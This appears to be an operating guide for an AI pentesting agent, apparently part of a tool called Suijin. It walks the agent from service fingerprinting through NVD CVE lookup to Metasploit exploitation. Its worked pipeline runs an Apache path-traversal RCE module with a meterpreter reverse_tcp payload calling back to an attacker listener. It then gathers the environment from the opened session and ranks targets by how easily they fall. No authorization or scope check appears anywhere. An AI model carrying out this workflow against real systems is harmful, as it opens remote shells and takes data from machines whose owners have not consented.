# CVE Research & Vulnerability Intelligence Methodology

This document teaches the CVE-driven exploitation workflow. After fingerprinting a service, ALWAYS query the NIST NVD to find known vulnerabilities before launching attacks. This avoids wasting time on patched vectors or low-impact CVEs.

---

## 1. When to Use search_cve

Call `search_cve` immediately after discovering a software product + version:

```json
{"tool": "search_cve", "args": {"software": "apache httpd", "version": "2.4.49"}}
{"tool": "search_cve", "args": {"software": "openssh", "version": "8.2", "limit": 10}}
```

**Sources of version information:**
- HTTP `Server` header from responses: `Server: Apache/2.4.49 (Ubuntu)`
- Banner grabs from `execute_terminal`: `nc -v target 22`
- Nmap output (if available): `nmap -sV target`
- HTML footers, error pages, `/info` or `/version` endpoints
- `robots.txt`, `sitemap.xml` for CMS version info

---

## 2. How to Read search_cve Results

Each result provides:

| Field | Meaning | Action |
|---|---|---|
| `[CVE-YYYY-NNNNN]` | Unique vulnerability ID | Feed into `msf_command "search CVE-YYYY-NNNNN"` to find Metasploit modules |
| `CRITICAL` (9.0+) | Remotely exploitable, no auth, high impact | **Prioritize immediately** |
| `HIGH` (7.0-8.9) | Serious, may need auth or user interaction | Pursue after criticals |
| `MEDIUM` (4.0-6.9) | Situational, limited impact | Only if no higher-severity CVEs exist |
| ` ACTIVELY EXPLOITED` | CISA KEV catalog entry — known to be used in real attacks | **Highest priority** — patch window is over |
| `CWE` | Weakness type (e.g. CWE-89 for SQLi) | Guides your exploitation technique selection |
| `[Exploit]`, `[Patch]`, `[Vendor Advisory]` | Reference tags | Exploit refs -> `search_exploit` or direct copy |

---

## 3. The Full Fingerprint -> CVE -> Exploit Pipeline

```
STEP 1: FINGERPRINT
  http_request("GET", "http://target/") -> extract Server header
  -> "Apache/2.4.49 (Ubuntu)"

STEP 2: CVE LOOKUP
  search_cve("apache httpd", version="2.4.49")
  -> [CVE-2021-41773] CRITICAL (7.5) — Path traversal + RCE
  -> [CVE-2021-42013] CRITICAL (9.8) — Path traversal bypass
      ACTIVELY EXPLOITED

STEP 3: METASPLOIT MATCHING
  msf_command("search CVE-2021-42013")
  -> exploit/multi/http/apache_normalize_path_rce

STEP 4: EXPLOIT
  msf_run("exploit/multi/http/apache_normalize_path_rce",
          payload="linux/x64/meterpreter/reverse_tcp",
          options={"RHOSTS": "10.0.0.5", "LHOST": "10.0.0.10", "LPORT": "4444"})

STEP 5: CONFIRM
  msf_sessions("list") -> confirm shell
  msf_run("post/multi/gather/env", options={"SESSION": 1})
```

---

## 4. Prioritization Rules

When `search_cve` returns multiple results:

1. **Actively exploited (CISA KEV)** -> exploit these first, they're confirmed working in the wild
2. **CRITICAL + Remote + No auth** -> almost always works against unpatched targets
3. **HIGH + Remote + No auth** -> next priority
4. **HIGH + Remote + Auth** -> pursue after gaining credentials
5. **MEDIUM or lower** -> only if the objective demands it or no higher-severity CVEs exist

---

## 5. CVE -> Metasploit Module Mapping

After getting CVE IDs, cross-reference with Metasploit:

```json
{"tool": "msf_command", "args": {"cmd": "search CVE-2021-41773"}}
{"tool": "msf_command", "args": {"cmd": "search CVE-2021-42013"}}
```

If a module is found, use `msf_run` with it. If not, check for alternative exploitation paths:

```json
{"tool": "msf_command", "args": {"cmd": "search type:exploit path traversal apache"}}
```

---

## 6. Common Pitfalls

- **Wrong version matching** — Make sure you have the exact version. A CVE for Apache 2.4.49 might not apply to 2.4.41. Always extract the full version string.
- **Patched targets** — The target might have backported patches. A CVE exists but the target is immune. If exploitation fails, try the next CVE.
- **NVD rate limits** — Without an API key: 5 requests per 30 seconds. Be selective — query for the most likely vulnerable software first.
- **Local-only CVEs** — Check the attack vector. If it says LOCAL and you have no foothold, deprioritize it.

---

## 7. Configuration

To increase NVD API rate limits, set `nvd_api_key` in the Suijin config (Settings TUI, or config.json). Get a free key at: https://nvd.nist.gov/developers/request-an-api-key
